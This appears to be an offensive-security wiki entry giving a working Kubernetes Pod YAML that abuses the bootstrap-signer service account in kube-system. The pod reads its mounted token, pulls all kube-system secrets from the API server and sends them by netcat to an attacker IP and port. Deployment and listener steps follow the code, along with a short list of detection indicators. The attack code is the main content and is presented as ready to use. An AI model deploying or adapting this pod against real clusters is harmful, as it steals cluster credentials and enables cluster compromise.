---
id: 7e98fd6c-e628-4feb-a287-084cf45889cc
name: Kubernetes-Malicious-Alpine-Pod-YAML-for-Secret-Exfiltration
type: code
language: yaml
verified: true
created_at: '2023-04-06T03:56:01.251018+00:00'
updated_at: '2023-04-10T20:34:03.129264+00:00'
platforms:
  - Kubernetes
tags:
  - pod-yaml
  - malicious-pod
  - secret-exfiltration
validated: true
---

# Kubernetes-Malicious-Alpine-Pod-YAML-for-Secret-Exfiltration

## Code

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

## Description

This YAML defines a malicious Kubernetes Pod named 'alpine' in the kube-system namespace. It uses the bootstrap-signer service account, enables host networking to bypass restrictions, and mounts the service account token. Upon deployment, the Alpine container installs curl, reads the token, queries the API for kube-system secrets, exfiltrates the response via netcat to an attacker IP, and sleeps indefinitely for persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `192.168.154.228` (API IP) | Kubernetes API server IP address | `kubernetes-api.example.com` or `10.0.0.1` |
| `8443` (API Port) | Port for the Kubernetes API server | `6443` (default) |
| `192.168.154.228` (Exfil IP) | Attacker's IP for receiving exfiltrated data | `attacker-ip.example.com` |
| `6666` (Exfil Port) | Port on attacker machine listening with netcat | `4444` |

## Usage

Save this YAML to 'malicious-pod.yaml', replace hardcoded IPs and ports with your environment (e.g., cluster API endpoint and listener details), then apply using [[commands/kubectl-apply-malicious-pod-yaml]]. Start a listener like `nc -lvnp 6666` on the attacker machine before deployment. Used in procedures like [[procedures/Abuse-Kubernetes-Bootstrap-Signer-RBAC-to-Deploy-Malicious-Pod]] for RBAC abuse and data exfiltration.

## Detection

- Audit logs showing pod creation in kube-system with hostNetwork: true or unusual serviceAccountName.
- API server logs for unauthorized secret queries from bootstrap-signer token.
- Network traffic: Outbound nc connections from pods to external IPs on non-standard ports.
- Pod inspection revealing Alpine image with curl installation and sleep command.

## Related

- [[procedures/Abuse-Kubernetes-Bootstrap-Signer-RBAC-to-Deploy-Malicious-Pod]]
